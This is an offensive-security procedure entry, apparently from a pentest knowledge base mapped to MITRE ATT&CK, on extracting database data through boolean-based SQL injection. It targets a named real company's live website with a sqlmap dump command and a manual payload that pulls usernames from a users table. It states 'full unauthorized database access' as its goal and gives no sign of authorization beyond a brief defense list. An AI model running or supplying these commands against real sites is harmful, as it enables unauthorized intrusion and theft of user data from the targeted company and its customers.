---
id: proc-sqli-extract-boolean-001
name: Extract-Database-Data-via-Boolean-SQLi
tags:
  - sqli
  - data-exfiltration
  - boolean-based
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-dump-boolean]]'
  - '[[commands/manual-data-extraction]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.097Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Database-Data-via-Boolean-SQLi

## Summary

This procedure outlines extracting database contents using boolean-based SQL injection, enabling unauthorized access to sensitive data in applications like Zomato's, rated critical for potential data manipulation or theft.

## Description

Once boolean payloads are confirmed, this procedure uses them to enumerate and dump data from the database. For Zomato, this could expose user orders, profiles, or configs. It involves binary search-like guessing for data values, making it stealthy but time-intensive. Automation with tools accelerates the process, but manual methods ensure precision in noisy environments.

## Requirements

1. Vulnerable endpoint with confirmed boolean SQLi
2. sqlmap or equivalent tool for dumping
3. Patience for iterative requests (hundreds per data field)

## Defense

Defensive measures and detection strategies:

- Use database activity monitoring to flag unusual query patterns
- Encrypt sensitive data at rest to limit impact of exfiltration
- Deploy intrusion detection systems (IDS) tuned for SQLi signatures

## Objectives

1. Enumerate database structure (DBs, tables, columns)
2. Dump critical data like user records
3. Achieve full unauthorized database access

## Instructions

### Step 1: Dump Database Schema

**Context**: First, extract metadata to understand the target's structure before targeting data.

**Command** ([[commands/sqlmap-dump-boolean]]):
```bash
sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql --dump --schema
```

> Output lists databases, tables (e.g., "users", "orders"), and columns.

### Step 2: Extract Specific Data

**Context**: Target high-value tables and use boolean conditions to reconstruct data fields.

**Command** ([[commands/manual-data-extraction]]):
```bash
# Payload example for username extraction: ' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64 --
```

> Binary search on ASCII values (true/false responses narrow the range); repeat for each position until full string is built.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-dump-boolean]]
- [[commands/manual-data-extraction]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- [[sqli]]
- [[data-exfiltration]]
- [[boolean-based]]
